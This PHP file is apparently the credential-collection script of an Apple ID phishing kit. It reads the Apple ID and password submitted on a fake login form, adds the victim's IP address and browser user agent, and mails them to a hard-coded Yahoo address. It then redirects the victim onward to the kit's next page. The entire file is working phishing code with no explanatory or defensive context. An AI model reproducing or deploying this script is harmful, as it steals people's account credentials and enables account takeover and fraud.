<?php
session_start(); 
include "../bots.php";

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "==========[LOGIN INFOS]=========<br>\n";
$bilsmg .= "|Apple ID : ".$_POST['aemail']."<br>\n";
$bilsmg .= "|Password : ".$_POST['apass']."<br>\n";
$bilsmg .= "=============[INFOS]============<br>\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";
$bilsmg .= "User Agent:  ".$_SERVER['HTTP_USER_AGENT']."\n";

$bilsnd = "yosrsafi@yahoo.fr";
$bilsub = "Apple LOGIN | From $ip";
$bilhead = "From:LOGIN INFOS <support>";
$bilhead .= $_POST['yosrsafi@yahoo.fr']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../process.php?dispatch={$_SESSION['DISPATCH_MD5_3']}";
header("location:$src");
?>